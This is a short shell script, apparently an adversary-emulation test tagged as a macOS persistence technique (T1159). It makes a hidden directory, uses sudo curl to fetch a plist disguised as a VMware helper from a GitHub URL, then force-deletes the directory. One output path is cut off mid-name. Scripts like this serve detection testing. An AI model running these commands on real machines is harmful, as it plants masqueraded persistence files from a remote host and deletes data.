#!/usr/bin/env sh
# ATTACK_PERSISTENCE_T1159_MACOS_FILE_PLIST_HIDDEN
mkdir ~/Library/Application\ Support/.tmp12
mkdir ~/Library/Application\ Support/.tmp12/tmp/
sudo curl https://raw.githubusercontent.com/Pratik-987/Macos/main/com.vmware.IDHelper.plist -o ~/Library/Application\ Support/.tmp12/tmp/com.vmware$
#cp ~/Downloads/com.vmware.IDHelper.plist ~/Library/Application\ Support/.tmp12/tmp/
sleep 5
rm -rf -R ~/Library/Application\ Support/.tmp12
